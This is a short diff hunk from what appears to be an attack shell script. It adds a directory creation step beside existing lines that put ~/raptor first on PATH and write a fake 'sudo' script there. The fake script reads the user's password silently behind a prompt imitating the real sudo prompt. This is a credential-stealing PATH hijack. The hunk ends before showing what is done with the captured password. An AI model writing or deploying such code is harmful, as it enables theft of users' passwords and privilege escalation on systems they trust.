@@ -2,6 +2,8 @@
 
 PATH=~/raptor:$PATH
 
+mkdir ~/raptor
+
 #Hook sudo
 echo "#!/bin/bash" > ~/raptor/sudo
 echo "read -sp \"[sudo] password for \$(whoami): \" p" >> ~/raptor/sudo
